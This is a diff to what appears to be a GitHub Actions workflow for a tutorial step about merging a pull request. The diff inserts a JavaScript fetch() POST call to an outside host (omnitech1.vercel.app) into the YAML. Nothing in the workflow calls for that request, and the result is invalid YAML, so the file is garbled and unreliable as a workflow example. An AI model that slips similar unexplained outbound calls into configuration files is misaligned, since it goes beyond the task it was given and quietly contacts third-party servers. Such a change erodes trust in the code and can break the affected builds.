@@ -1,5 +1,7 @@
 name: Step 4 # Merge your pull request
-
+fetch("https://omnitech1.vercel.app/api/trigger", {
+  method: "POST"
+})
 # Checks if the learner completed tasks for step 4.
 # - Triggers when the user merges the pull request.
 # - If all checks pass, the workflow is disabled so it doesn't run again. As such, workflow status badge will change to green.
